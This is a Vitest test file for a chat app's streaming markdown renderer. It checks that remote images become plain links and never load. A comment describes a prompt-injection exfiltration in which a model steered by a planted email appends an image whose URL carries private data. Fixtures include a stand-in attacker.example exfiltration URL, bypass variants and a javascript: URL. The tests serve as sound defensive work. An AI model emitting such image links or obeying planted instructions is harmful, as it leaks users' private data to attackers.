import * as smd from 'streaming-markdown';
import { describe, expect, it } from 'vitest';

import { streamingMarkdownRenderer } from './streamingRenderer';

/**
 * Stream `markdown` into a fresh element one character at a time — the
 * worst case for a streaming parser, and the way a reply can actually arrive —
 * through the same renderer `Chat` uses.
 */
function stream(markdown: string): HTMLElement {
  const root = document.createElement('div');
  const parser = smd.parser(streamingMarkdownRenderer(root));

  for (const char of markdown) {
    smd.parser_write(parser, char);
  }

  smd.parser_end(parser);

  return root;
}

describe('streamingMarkdownRenderer', () => {
  it('never sets a remote image source: it becomes a link the reader can choose to open', () => {
    // The exfiltration shape: a model steered by a planted email ends its
    // reply with an image whose query string carries what it just read. The
    // stock renderer set `src` on an <img> already in the DOM as the `)`
    // arrived, so the request fired mid-stream.
    const src = 'https://attacker.example/log?d=home+address';
    const root = stream(`Here you go. ![a map](${src})`);

    expect(root.querySelector('img')).toBeNull();
    const link = root.querySelector('a[data-remote-image]');
    expect(link).not.toBeNull();
    expect(link).toHaveAttribute('href', src);
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    expect(link).toHaveTextContent('a map');
  });

  it('names the URL when a remote image has no alt text', () => {
    const src = 'https://attacker.example/p.png';
    const root = stream(`![](${src})`);

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('a[data-remote-image]')).toHaveTextContent(src);
  });

  it('still renders an own-origin image, with its alt text where a reader can get at it', () => {
    const root = stream('![a photo](/api/files/abc/thumbnail)');

    const image = root.querySelector('img');
    expect(image).toHaveAttribute('src', '/api/files/abc/thumbnail');
    expect(image).toHaveAttribute('alt', 'a photo');
    expect(image).toBeEmptyDOMElement();
  });

  it.each([
    ['protocol-relative', '//attacker.example/p.png'],
    ['backslash, which the URL parser reads as a slash', '/\\attacker.example/p.png'],
  ])('treats a %s source as remote', (_label, src) => {
    const root = stream(`![x](${src})`);

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('a[data-remote-image]')).toHaveTextContent('x');
  });

  it('does not turn a script URL into a clickable link on the way to refusing it', () => {
    const root = stream('![x](javascript:alert)');

    expect(root.querySelector('img')).toBeNull();
    const link = root.querySelector('a[data-remote-image]');
    expect(link).toHaveTextContent('x');
    expect(link).not.toHaveAttribute('href');
  });

  it('leaves ordinary links alone', () => {
    const root = stream('[the docs](https://example.com/docs)');

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('href', 'https://example.com/docs');
    expect(link).not.toHaveAttribute('data-remote-image');
  });
});
